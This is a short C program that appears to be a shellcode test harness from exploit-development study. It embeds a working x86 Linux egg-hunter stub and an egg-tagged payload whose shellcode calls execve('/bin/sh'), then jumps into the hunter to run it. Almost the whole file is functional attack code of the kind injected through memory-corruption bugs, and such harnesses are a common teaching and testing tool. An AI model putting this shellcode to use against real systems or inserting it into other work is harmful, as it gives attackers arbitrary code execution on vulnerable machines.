#include<stdlib.h>
#include<stdio.h>
#include<string.h>

unsigned char egghunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x6a"
"\x43\x58\xcd\x80\x3c\xf2\x74"
"\xf1\xb8\x90\x50\x90\x50\x89"
"\xcf\xaf\x75\xec\xaf\x75\xe9"
"\xff\xe7";

unsigned char code[] = \
"\x90\x50\x90\x50\x90\x50\x90\x50" // EGG - [NOP, PUSH eax] x4
"\x31\xc0\x50\x68\x6e\x2f\x73\x68" //shellcode executes execve("/bin/sh", 0, 0)
"\x68\x2f\x2f\x62\x69\x89\xe3\x50"
"\x89\xe2\x53\x89\xe1\xb0\x0b\xcd"
"\x80";

main()
{
	char *buffer;
	buffer = malloc(strlen(code));
	memcpy(buffer, code, strlen(code));

	printf("\nEgg Hunter Length: %d\n", strlen(egghunter));
	printf("Shellcode Length: %d\n\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();

	free(buffer);
}
